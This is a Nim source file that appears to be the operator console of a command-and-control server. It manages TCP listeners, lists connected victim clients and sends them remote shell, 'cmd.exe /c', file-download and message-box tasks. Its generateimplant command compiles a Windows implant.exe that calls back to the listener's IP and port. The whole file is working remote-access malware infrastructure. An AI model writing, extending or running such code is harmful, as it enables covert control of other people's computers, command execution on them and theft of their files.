import asyncdispatch, asyncnet, threadpool, asyncfutures
import strutils, terminal, osproc, sequtils

import listeners/[tcp]
import communication
import ../utils

importCommands() # import ../commands/[shell, msgbox, download]
import types, logging

proc procStdin*(server: C2Server) {.async.} =
  var handlingClient: C2Client

  prompt(handlingClient, server)
  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():
      
      let input = ^messageFlowVar
      let args = input.split(" ")
      let argsn = len(args)
      let cmd = args[0]
      let a_args = args[1..(argsn - 1)].join(" ")

      case cmd:
        of "help":
            echo "-- Navigation"
            echo "\texit\twhy would you ever exit?"
            echo "\tback\tgo back to main menu"
            echo "\tinteract [id]\tinteract with a client"
            echo "-- Listeners"
            echo "\tstartlistener [type] [..args]\tstart a listener"
            echo "\tlisteners\tshow a list of listeners"
            echo "\tclientlisteners\tshow a list of listeners and their clients"
            echo "-- Implants"
            echo "\tgenerateimplant [listener type] [listener ID]\tgenerate an implant"
            echo "-- Managing clients"
            echo "\tclients\tview a list of clients"
            echo "\tinfo\tget info about a client"
            echo "\tshell\trun a shell command"
            echo "\tcmd\trun a cmd command ('cmd.exe /c')"
            echo "\tmsgbox\tsend a message box"
        
        # implants

        of "generateimplant":
            let a_args_split = a_args.toLower().split(":")
            let listenerType = a_args_split[0]
            let listenerId = parseInt(a_args_split[1])
            if listenerType == "tcp":

                if len(server.tcpListeners) > listenerId:
                    let tcpListener = server.tcpListeners[listenerId]
                    infoLog "generating implant for " & $tcpListener
                    let ip = tcpListener.listeningIP
                    let port = tcpListener.port
                    let exitCode = execCmd("nim c -d:client -d:ip=" & ip & " -d:port=" & $port & " -o:implant.exe .\\src\\client\\client.nim")
                    # echo outp
                    if exitCode != 0:
                        errorLog "failed to build implant for " & $tcpListener
                    else:
                        infoLog "saved implant to implant.exe"
                else:
                    errorLog "there are no tcp listeners with id " & $listenerId 

        # listener management

        of "listeners":
            for tcpListener in server.tcpListeners:
                infoLog @tcpListener
            infoLog $len(server.tcpListeners) & " listeners"
        of "clientlisteners":
            for tcpListener in server.tcpListeners:
                infoLog @tcpListener
                for client in server.clients:
                    if client.listenerType == "tcp" and client.listenerId == tcpListener.id and client.connected:
                        infoLog "\t<- " & $client
            infoLog $len(server.tcpListeners) & " listeners"
        of "startlistener":
            if argsn >= 2:
                if args[1].toLower() == "tcp":
                    if argsn >= 4:
                        asyncCheck server.createNewTcpListener(parseInt(args[3]), args[2])
                    else:
                        echo "Bad usage, correct usage: startlistener TCP (ip) (port)"
            else:
                echo "You need to specify the type of listener you wanna start, supported: TCP"
        
        # clients management

        of "clients":
            for client in server.clients:
                if client.connected:
                    stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
                else:
                    stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
            infoLog $len(server.clients) & " clients currently connected"
        of "info":
            echo @handlingClient

        # tasks management

        of "tasks":
            for task in server.tasks:
                echo $task.client & " <= " & $task

        # navigation
        
        of "interact":
            for client in server.clients:
                if client.id == parseInt(args[1]):
                    handlingClient = client
            if handlingClient.isNil() or handlingClient.id != parseInt(args[1]):
                infoLog "client not found"
        of "back": 
            handlingClient = nil
        of "exit":
            for tcpListener in server.tcpListeners:
                tcpListener.running = false
                tcpListener.socket.close()

        # client commands

        of "download":
            let task = await download.sendTask(handlingClient, args[1])
            await task.awaitResponse()
        of "shell":
            let task = await shell.sendTask(handlingClient, a_args)
            await task.awaitResponse()
        of "cmd":
            let task = await shell.sendTask(handlingClient, "cmd.exe /c " & a_args)
            await task.awaitResponse()
        of "msgbox":
            if argsn >= 3:
                let slashSplit = a_args.split("/")
                discard await msgbox.sendTask(handlingClient, slashSplit[1].strip(), slashSplit[0].strip())
            else:
                echo "wrong usage. msgbox (title) / (caption)"

            # quit(0)

      prompt(handlingClient, server)
      messageFlowVar = spawn stdin.readLine()
      
    await asyncdispatch.sleepAsync(100)
